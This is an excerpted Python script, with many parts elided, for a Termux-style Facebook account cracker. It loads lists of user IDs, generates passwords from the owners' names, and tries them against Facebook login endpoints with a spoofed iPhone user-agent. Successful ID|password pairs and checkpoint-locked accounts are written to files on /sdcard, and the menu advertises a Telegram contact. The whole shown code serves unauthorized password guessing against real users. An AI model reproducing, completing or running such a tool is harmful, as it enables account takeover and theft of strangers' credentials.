...
def auto_file(cookies,access_token):
        ...
        print('\n \033[1;97m /sdcard/ERR0R.txt \033[0;97m\n')
        #100010138361148
...
def menu():
        ...
        try:
                ...
                if "server on" in sj:
                        #clear()
                        print('\033[1;37m  : \033[1;32m＄\n------------------------------------------\n\033[1;35m [ 1 ]  CRACK WITH FILE  \033[1;32m[𝑉𝐼𝑃]\n------------------------------------------ ')
                        linex()
                        xd=input('\033[1;35m[=] \033[1;37m𝐶𝐻𝑂𝑂𝑆𝐸 : ')
                        if xd in ['1','01']:
                               
                                linex()
                                file = input('Example ➔ : \033[1;32m‌/sdcard/AHMED\n----------------------------------------------\nPaste Your File : \033[1;32m  ')
                                try:
                                        ...
                                        menu()
                                linex()
                                print('\x1b[1;92mTelegram ➔ @ احمد\n ----------------------------------------------\n [ 1 ] \033[1;32mCrack Auto Password')
                                linex()
                                mthd=input(' Choose: ')
                                linex()
                                plist = []
                                print('\x1b[1;92m [ 1 ] AUTO PASSWORD ');linex()
                                ppp=input(' Choose: ')
                                if ppp in ['1','01']:
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;36m [\033[1;32mAHMED\033[1;36m] \033[1;36m[\033[1;31m%s\033[1;36m] \033[1;36m[\033[1;32mOK\033[1;30m:-\033[1;32m%s\033[1;36m] \033[1;36m[\033[1;33m%s%%\033[1;36m]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
        sys.stdout.flush()
    ...
    "user-agent": ua,
                        ...
                        if "c_user" in ASX:
                                print('\r\r\033[1;32m ahmeds | %s'%(ids,pas))
                                ...
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m 𝐉ERR0R-CP '+ids+' | '+pas+'\033[1;97m')
...
def api(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write('\r\r\033[1;37m [ahmed] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                            ...
                            "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',}
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m ERR0R '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ERR0R-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m 𝐉ahmed-CP '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ahmed-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                        ...
                        if 'session_key' in po:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m 𝐉ahmed-CP'+str(uid)+' | '+pas+'\033[1;97m')
